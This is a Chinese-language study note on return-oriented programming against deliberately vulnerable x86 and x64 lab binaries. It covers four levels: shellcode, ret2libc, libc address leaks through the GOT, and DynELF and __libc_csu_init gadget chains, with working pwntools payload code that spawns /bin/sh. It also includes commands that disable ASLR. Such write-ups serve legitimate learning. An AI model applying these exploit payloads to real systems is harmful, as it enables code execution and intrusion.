## 参考文章
1. <http://wps2015.org/drops/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x86%E7%AF%87.html>  
2. <http://wps2015.org/drops/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html>

## 总结
很早之前看的两篇经典的rop文章。今天复习了一下x86中rop的利用方法，漏洞是简单的栈溢出，根据利用方式不同分四个level。  

## x86
### level1   
```
编译
gcc -fno-stack-protector -z execstack -o level1 level1.c -m32
关闭ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
利用方式：gdb 中pattern_create、pattern_offset计算offset，溢出返回地址为shellcode即可。
  
gdb attach后会改变程序stack，导致溢出点的栈地址改变，用gdb 调试core dump文件即可。
```
# 开启core dump
ulimit -c unlimited
sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
# 调试core dump
gdb process core-xxxx
# gdb attach 服务
socat TCP4-LISTEN:10001,fork EXEC:./level1
ps aux | grep -E "level1|PID"
sudo gdb attach PID
```
### level2
```
编译
gcc -fno-stack-protector -o level1 level1.c -m32
关闭ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
利用方式：开启NX后，查看libc中的system和/bin/sh地址即可。`p32(system_addr) + p32(0xdeadbeaf) + p32(binsh_addr)`
```
gdb> print system
gdb> find '/bin/sh\x00'
```

### level3

```
编译
gcc -fno-stack-protector -o level1 level1.c -m32
开启ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
利用方式：开启ASLR后，泄漏libc中任意函数的地址，计算libc中system和/bin/sh的真实地址。
```
# objdump -d -j .plt level3
write_plt = 0x8048320
# objdump -R level3
write_got = 0x0804a014
main = 0x8048460
payload = 'B'*140 + p32(write_plt) + p32(main) + p32(1)  + p32(write_got) + p32(0x10)
p.sendline(payload)

write_addr = u32(p.recv()[0:4])
log.info('write addr :'+ hex(write_addr))

libc = ELF('./libc.so')
write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search('/bin/sh'))
system_addr = write_addr - (write_offset - system_offset)
binsh_addr = write_addr - (write_offset - binsh_offset)
log.info('system_addr:'+hex(system_addr))

payload2 = 'B'*140 + p32(system_addr) + p32(0xdeafbeaf) + p32(binsh_addr)

```

### level4 
```
编译
gcc -fno-stack-protector -o level1 level1.c -m32
开启ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
不提供libc
```
利用方式：由于无libc，需要通过pwnlib中的DynELF来泄漏system的地址。条件是，可以每次泄漏至少任意地址一个字节。
```
write_plt = 0x8048320
read_plt = 0x8048300
main = 0x8048460

def leak(address):
    payload = 'B'*140 + p32(write_plt) + p32(main) + p32(1)  + p32(address) + p32(4) # 1<= size is ok 
    p.sendline(payload)
    data = p.recv(4)
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data


d = DynELF(leak, elf=ELF('level4'))
system_addr = d.lookup('system', 'libc')
log.info("system_addr=" + hex(system_addr))

# write /bin/sh
bss_addr = 0x0804a020
ret_addr = 0x080484f9 #  pop esi ; pop edi ; pop ebp ; ret
payload = 'B'*140 + p32(read_plt) +  p32(ret_addr) +  p32(0) + p32(bss_addr) + p32(8)
payload += p32(system_addr) + p32(0xdeafbeaf) + p32(bss_addr)

p.sendline(payload)
p.sendline("/bin/sh\x00")
```

## x64
64位程序：可使用的地址空间<0x7fffffffffff，传参从rdi rsi rdx rcx r8 r9 到栈。程序都开启了ASLR和NX，没看canary。
### level1
修改返回值为system函数的地址即可。
### level2
程序给出了system的地址，构造rop。`payload = 'A'*136 + p64(poprdi_ret)  + p64(binsh_addr) + p64(system_addr)`

### level3
程序仅有一个栈溢出，存在read和write的got表。思路和之前一致，泄漏write函数的实际地址，计算system的地址，构造rop。重点在于rop的构造，利用__libc_csu_init函数中的gadgets。
```
400600:   4c 89 ea                mov    %r13,%rdx
  400603:   4c 89 f6                mov    %r14,%rsi
  400606:   44 89 ff                mov    %r15d,%edi
  400609:   41 ff 14 dc             callq  *(%r12,%rbx,8)
  40060d:   48 83 c3 01             add    $0x1,%rbx
  400611:   48 39 eb                cmp    %rbp,%rbx
  400614:   75 ea                   jne    400600 <__libc_csu_init+0x40>
  400616:   48 83 c4 08             add    $0x8,%rsp
  40061a:   5b                      pop    %rbx
  40061b:   5d                      pop    %rbp
  40061c:   41 5c                   pop    %r12
  40061e:   41 5d                   pop    %r13
  400620:   41 5e                   pop    %r14
  400622:   41 5f                   pop    %r15
  400624:   c3                      retq  

#write(1,write_got,0x8)

main = 0x400587
poprbx = 0x40061a
movrdx = 0x400600
rbx = 0x0
rbp = 0x1
r12 = write_got # call *(write_got)
r13 = 0x8 # third
r14 = write_got # second
r15 = 0x1 # first
payload = 'B'*136 + p64(poprbx) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) +p64(r14) + p64(r15)
payload += p64(movrdx) + p64(0xdeadbeaf)*7 + p64(main)

```
同样，通过DynELF来完成了无libc的函数泄漏，完成了exp_withoutlibc.py版的exp。
注意，system函数调用execve来执行/bin/sh，而execve的参数有三个，和栈上的内容有关系，尽量把无关紧要的偏移用\x00来填充。此外，DynELF不是很稳定，多打几次就好了。
